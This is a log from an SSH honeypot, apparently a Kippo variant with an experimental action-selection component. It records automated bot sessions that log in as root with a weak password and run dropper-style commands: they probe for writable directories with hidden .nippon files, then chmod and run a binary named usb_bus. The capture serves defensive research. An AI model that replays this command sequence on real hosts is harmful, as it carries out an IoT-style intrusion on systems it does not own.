+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] /tmp/.nippon resolved into /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: rm -f /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: rm -f /tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: cat /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: cat /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] /var/tmp/.nippon resolved into /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: rm -f /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: rm -f /var/tmp/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/' > //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/' > //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: cat //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: cat //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] /.nippon resolved into /.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: rm -f //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: rm -f //.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: echo -e '\x47\x72\x6f\x70/lib/init/rw' > /lib/init/rw/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: echo -e '\x47\x72\x6f\x70/lib/init/rw' > /lib/init/rw/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: cat /lib/init/rw/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: cat /lib/init/rw/.nippon 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] INPUT: bus  
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] INPUT: chmod 777 usb_bus  
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] INPUT: ./usb_bus  
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Received unhandled keyID: '\x16' 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Received CTRL-C, exiting.. 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] CMD: exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Command found: exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] isAllow start 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] getAction start exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] get current command -============================ exit 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] do action =================================== 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:44:28+0000 [SSHChannel session (2) on SSHService ssh-connection on HoneyPotTransport,2,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] Got remote error, code 11 
+		reason: disconnected by user 
+2017-12-19 13:44:28+0000 [HoneyPotTransport,2,127.0.0.1] connection lost 
+2017-12-19 13:50:38+0000 [kippo.core.honeypot.HoneyPotSSHFactory] New connection: 127.0.0.1:56675 (127.0.0.1:2222) [session: 3] 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] Remote SSH version: SSH-2.0-OpenSSH_6.2 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] outgoing: aes128-ctr hmac-md5 none 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] incoming: aes128-ctr hmac-md5 none 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] NEW KEYS 
+2017-12-19 13:50:38+0000 [HoneyPotTransport,3,127.0.0.1] starting service ssh-userauth 
+2017-12-19 13:50:38+0000 [SSHService ssh-userauth on HoneyPotTransport,3,127.0.0.1] root trying auth none 
+2017-12-19 13:50:38+0000 [SSHService ssh-userauth on HoneyPotTransport,3,127.0.0.1] root trying auth keyboard-interactive 
+2017-12-19 13:50:38+0000 [SSHService ssh-userauth on HoneyPotTransport,3,127.0.0.1] login attempt [root/123456] succeeded 
+2017-12-19 13:50:38+0000 [SSHService ssh-userauth on HoneyPotTransport,3,127.0.0.1] root authenticated with keyboard-interactive 
+2017-12-19 13:50:38+0000 [SSHService ssh-userauth on HoneyPotTransport,3,127.0.0.1] starting service ssh-connection 
+2017-12-19 13:50:38+0000 [SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] got channel session request 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] channel open 
+2017-12-19 13:50:38+0000 [SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] got global no-more-sessions@openssh.com request 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] pty request: xterm-256color (24, 80, 560, 336) 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Terminal size: 24 80 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] request_env: '\x00\x00\x00\x04LANG\x00\x00\x00\x0ben_IE.UTF-8' 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getting shell 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Opening TTY log: log/tty/20171219-135038-4863.log 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] /etc/motd resolved into /etc/motd 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: /bin/busybox cp 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command not found: /bin/busybox cp 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command not found: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: mount  
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: mount 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] start to get action .. 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start mount 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ mount 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 0.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ********************[  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] saving the case ... 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Reading txtcmd from "/Users/sosdow/Documents/workspace/kippo/txtcmds/bin/mount" 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: /gweerwe323f 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command not found: /gweerwe323f
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: echo -e \x47\x72\x6f\x70/dev' > /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev' > /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: cat /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: cat /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [[  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: rm -f /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: rm -f /dev/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ rm 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: echo -e \x47\x72\x6f\x70/dev/shm' > /dev/shm/ 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ echo 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 1.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: cat /dev/shm/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Command found: cat /dev/shm/.nippon 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] isAllow start 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] case is saving [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] getAction start cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] get current command -============================ cat 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] do action =================================== 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] Action performed:  [ 2.] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] ******************** [  0.09798935          0.3495         0.0995] 
+2017-12-19 13:50:38+0000 [SSHChannel session (3) on SSHService ssh-connection on HoneyPotTransport,3,127.0.0.1] CMD: rm -f /dev/shm/.nippon 
